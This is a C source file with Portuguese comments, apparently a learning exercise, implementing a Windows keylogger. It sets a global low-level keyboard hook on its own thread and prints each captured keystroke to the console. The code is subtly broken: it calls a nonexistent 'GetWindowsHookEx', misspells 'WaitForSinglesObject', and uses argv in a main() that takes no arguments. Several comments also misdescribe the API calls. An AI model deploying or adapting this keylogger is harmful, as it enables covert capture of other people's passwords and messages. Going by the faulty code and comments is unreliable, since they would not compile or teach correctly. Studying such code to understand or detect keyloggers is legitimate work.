#include <stdio.h>
#include <stdlib.h>
#include <Windows.h> //contém as funções de captura de teclado. É um linguagem de mais baixo nível
#define _WIN32_WINNT 0x0400  //constante para pegar funionalidades para o sistema operacional pegar algumas funcionalidades importantes para o funcionamento do código

//função que vai desviar o teclado
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){ //LRESULT CALLBACK significa que sempre que receber um resultado (no caso, sempre que um usuário pressionar ou soltar uma tecla) então vai chamar a função de novo
    BOOL fEatKeystroke = FALSE; //se aqui fosse true, então a tecla não seria registrada no sistema

    if(nCode == HC_ACTION){ //detecta se houve uma ação do windows. Verifica se é uma ação de tecla válida
        switch(wParam){ //O switch verifica o tipo de evento as seguintes flags indicam quando a tecla foi pressionada 'down' e quando foi solta 'up'
            case WM_KEYDOWN: //tecla pressionada
            case WM_SYSKEYDOWN: //tecla especial pressionada
            case WM_KEYUP: //tecla solta
            case WM_SYSKEYUP: //tecla especial solta
            {
                PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam; //ponteiro que recebe o nome 'p' que contém informações da tecla pressionada
                printf("%c", p->vkCode); //vkCode é o código virtual da tecla pressionada
                break;
            }
        }
    }
    return (fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam)); //callback que define se o evento vai ser passado para outros programas ou é interceptado. Nesse caso a tecla é capturada, mas aind segue o fluxo no sistema
}

//multithreading: execução em paralelo para a não interrupção do fluxo de captura 
void MessageLoop(){  //looping que escuta e processa mensagens da fila de eventos do windows
    MSG message; //estrutura da mensagem
    while(GetMessage(&message, NULL, 0, 0)){ //enquanto estiver pegando a mensagem?
        TranslateMessage(&message); //traduz a mensagem porque vem em código de máquina
        DispatchMessage(&message); //para não ocupar muita memória
    }
}

DWORD WINAPI TheKeyLogger(){//injetar o código no sistema operacional
    HINSTANCE hinstExe = GetModuleHandle(NULL); //para especificar qual janela vincular o processo, especificar qual tela quero ler. Para pegar de todo o sistema, qualquer janela é NULL (pega o handle do módulo principal do processo atual)
    HHOOK hhLowLevelKybd = GetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinstExe , 0);//WH_KEYBOARD_LL é para pegar tudo antes de outros apps verem
    
    MessageLoop();//chama o loop
    UnhookWindowsHookEx(hhLowLevelKybd);//remover o gancho estabelecido no windows para não ficar preso no loop
    return 0; //para indicar que tudo aconteceu com sucesso
}
int main(){

    HANDLE hThread; //tipo handle é da api do windows é um manipulador de processo e uma thread é uma tarefa executada pelo processador dentro de um processo (exemplo: dentro da aba de um navegador, há várias thread: uma que renderiza a página, outra roda js, outra carrega recursos)
    DWORD dwThread; // 

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TheKeyLogger, (LPVOID)argv[0], NULL, &dwThread); //cria uma nova thread para rodar o TheKeyLogger
    if(hThread)//verifica se a thread está rodando
        return WaitForSinglesObject(hThread, INFINITE);
    else return 1;

    return 0;
}
//Para testar, é só utilizar um bloco de notas
//Cria um gancho no sistema para capturar eventos de teclado (o keylogger)
//Roda numa thread paralela
//Printa as teclas no terminal